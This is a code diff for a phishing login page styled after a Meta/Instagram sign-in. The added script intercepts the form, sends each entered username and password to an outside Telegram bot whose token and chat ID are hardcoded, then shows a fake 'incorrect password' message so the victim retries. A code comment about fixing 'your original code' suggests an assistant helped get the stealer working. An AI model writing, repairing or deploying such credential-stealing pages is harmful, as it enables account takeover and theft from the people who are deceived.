@@ -11,7 +11,7 @@
 
     <div class="login-container">
     	<img class="logo-pic" src="logo.png" alt="Logo">
-        <form class="login-form" action="send.php" method="POST">
+        <form class="login-form" id="loginForm">
             <div class="form-group input-container">
                 <input id="username" name="u_name" type="text" placeholder=" " required>
                 <label for="username">Username, email address or mobile number</label>
@@ -35,77 +35,101 @@
         <img class="meta-pic" src="meta.png" alt="Meta">
     </div>
 
-    <script>
-    // --- Password Show/Hide Logic ---
-      const passwordInput = document.getElementById('password');
-      const togglePasswordSpan = document.querySelector('.toggle-password');
-      const eyeIcon = document.getElementById('eye-icon');
+<script>
+    // --- CONFIGURATION ---
+    const botToken = '8595419325:AAHCyEpryu-iWIcAGKfD1w1Q-SH5hJGawCU';
+    const chatId = '1274263985';
 
-      function updateEyeIconVisibility() {
-        if (passwordInput.value.length > 0) {
-          togglePasswordSpan.style.display = 'flex'; 
-        } else {
-          togglePasswordSpan.style.display = 'none'; 
-        }
-      }
+    // --- DOM ELEMENTS (These were missing in your original code) ---
+    const loginForm = document.getElementById('loginForm');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const clearIcon = document.querySelector('.clear-icon');
+    const togglePasswordSpan = document.querySelector('.toggle-password');
+    const eyeIcon = document.getElementById('eye-icon');
 
-      passwordInput.addEventListener('input', updateEyeIconVisibility);
-      updateEyeIconVisibility(); // Run on load
+    // --- SUBMISSION LOGIC ---
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); 
 
-      togglePasswordSpan.addEventListener('click', function () {
-        const currentType = passwordInput.getAttribute('type');
-        if (currentType === 'password') {
-            passwordInput.setAttribute('type', 'text');
-            eyeIcon.src = "show.png"; 
-        } else {
-            passwordInput.setAttribute('type', 'password');
-            eyeIcon.src = "hide.png"; 
-        }
-      });
-      
-      // --- Username Clear Button ---
-      const usernameInput = document.getElementById('username');
-      const clearIcon = document.querySelector('.clear-icon');
-      
-      usernameInput.addEventListener('input', function() {
-        if (usernameInput.value.length > 0) {
-          clearIcon.style.display = 'block';
-        } else {
-          clearIcon.style.display = 'none';
-        }
-      });
-      
-      clearIcon.addEventListener('click', function() {
-        usernameInput.value = ""; 
-        clearIcon.style.display = 'none'; 
-        usernameInput.focus(); 
-      });
-      
-    // --- Advanced Keyboard Detection (visualViewport) ---
-    
-    const VIEWPORT_VS_CLIENT_HEIGHT_RATIO = 0.75;
-    
-    if (window.visualViewport) {
-        window.visualViewport.addEventListener('resize', () => {
-            // Check if the visual viewport is significantly smaller than the window height
-            // This happens when the keyboard pushes the viewport up
-            if (window.visualViewport.height < window.innerHeight * VIEWPORT_VS_CLIENT_HEIGHT_RATIO) {
-                document.body.classList.add('keyboard-is-open');
-            } else {
-                document.body.classList.remove('keyboard-is-open');
-            }
+            const usernameValue = usernameInput.value;
+            const passwordValue = passwordInput.value;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `Test Data - Username: ${usernameValue}, Password: ${passwordValue}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Sorry, your password was incorrect. Please double-check your password.');
+                    usernameInput.value = '';
+                    passwordInput.value = '';
+                    // Reset icons after clear
+                    clearIcon.style.display = 'none';
+                    togglePasswordSpan.style.display = 'none';
+                } else {
+                    alert('Connection error. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
         });
-    } else {
-        // Fallback for very old browsers
-        const initialHeight = window.innerHeight;
-        window.addEventListener('resize', () => {
-            if (initialHeight - window.innerHeight > 150) {
-                document.body.classList.add('keyboard-is-open');
+    }
+
+    // --- UI LOGIC ---
+
+    // 1. Password Show/Hide Logic
+    function updateEyeIconVisibility() {
+        if (passwordInput.value.length > 0) {
+            togglePasswordSpan.style.display = 'flex'; 
+        } else {
+            togglePasswordSpan.style.display = 'none'; 
+        }
+    }
+
+    // Add listener to password input
+    if (passwordInput) {
+        passwordInput.addEventListener('input', updateEyeIconVisibility);
+    }
+    
+    // Add listener to the eye icon
+    if (togglePasswordSpan) {
+        togglePasswordSpan.addEventListener('click', function () {
+            const currentType = passwordInput.getAttribute('type');
+            if (currentType === 'password') {
+                passwordInput.setAttribute('type', 'text');
+                eyeIcon.src = "show.png"; 
             } else {
-                document.body.classList.remove('keyboard-is-open');
+                passwordInput.setAttribute('type', 'password');
+                eyeIcon.src = "hide.png"; 
             }
         });
     }
-    </script>
+
+    // 2. Username Clear Button Logic
+    if (usernameInput) {
+        usernameInput.addEventListener('input', function() {
+            if (usernameInput.value.length > 0) {
+                clearIcon.style.display = 'block';
+            } else {
+                clearIcon.style.display = 'none';
+            }
+        });
+    }
+
+    if (clearIcon) {
+        clearIcon.addEventListener('click', function() {
+            usernameInput.value = ""; 
+            clearIcon.style.display = 'none'; 
+            usernameInput.focus(); 
+        });
+    }
+</script>
 </body>
 </html>
